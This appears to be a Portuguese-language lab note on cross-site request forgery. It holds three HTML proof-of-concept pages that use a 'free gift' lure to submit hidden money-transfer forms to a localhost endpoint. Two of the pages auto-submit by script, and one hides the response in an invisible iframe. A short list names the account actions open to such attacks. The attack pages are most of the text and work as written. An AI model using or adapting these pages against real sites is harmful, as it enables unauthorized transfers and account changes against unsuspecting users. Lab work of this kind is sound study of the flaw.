<!DOCTYPE html>
<html>
  <body>
    <h1>Você ganhou um brinde grátis! 😈</h1>

    <form id="csrf-form" action="http://localhost:8080/transfer" method="POST">
      <input type="hidden" name="amount" value="1000">
    </form>

    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>

<!DOCTYPE html>
<html>
  <head>
    <title>CSRF Attack</title>
  </head>
  <body>
    <h1>Você ganhou um brinde grátis!</h1>

    <form action="http://localhost:8080/transfer" method="POST">
      <input type="hidden" name="amount" value="1000">
      <input type="submit" value="Clique aqui para ganhar!">
    </form>
  </body>
</html>

<!DOCTYPE html>
<html>
  <body>
    <h1>Você ganhou um brinde grátis! 😈</h1>

    <iframe name="csrf-frame" style="display:none;"></iframe>
	<form action="http://localhost:8080/transfer" method="POST" target="csrf-frame">
	<input type="hidden" name="amount" value="1000">
	</form>
	<script>
	document.forms[0].submit();
	</script>

  </body>
</html>

Onde essa vulnerabilidade pode ser explorada:
Pode ser explorada sempre que a aplicação realiza ações importantes via requisição HTTP(Post) que usam cookies de sessão automática, não validam token CSRD, não exigem interação direta ou validação do usuário (como senha ou captcha)
- Transferência de dinheiro
- Alteração de senha
- Exclusão de conta de usuário
- Alteração de e-mail ou endereço de entrega
- Alteração ou criação de configuração de segurança
- Alteração de permissões de outros usuários